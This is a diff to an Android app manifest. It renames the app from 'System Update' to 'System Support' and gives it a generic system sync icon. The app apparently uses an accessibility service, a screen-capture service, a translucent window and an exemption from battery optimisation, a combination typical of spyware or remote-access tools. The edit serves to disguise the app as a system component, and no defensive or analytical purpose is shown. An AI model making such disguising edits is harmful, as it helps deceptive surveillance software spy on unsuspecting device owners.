@@ -8,8 +8,8 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
-        android:label="System Update"
-        android:icon="@android:drawable/ic_menu_info_details"
+        android:label="System Support"
+        android:icon="@android:drawable/stat_notify_sync"
         android:theme="@android:style/Theme.Translucent.NoTitleBar">
         
         <activity android:name=".MainActivity" android:exported="true">
@@ -28,6 +28,8 @@
             <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <service android:name=".ScreenService" android:foregroundServiceType="mediaProjection" android:exported="false" />
+        <service android:name=".ScreenService" 
+            android:foregroundServiceType="mediaProjection" 
+            android:exported="false" />
     </application>
 </manifest>
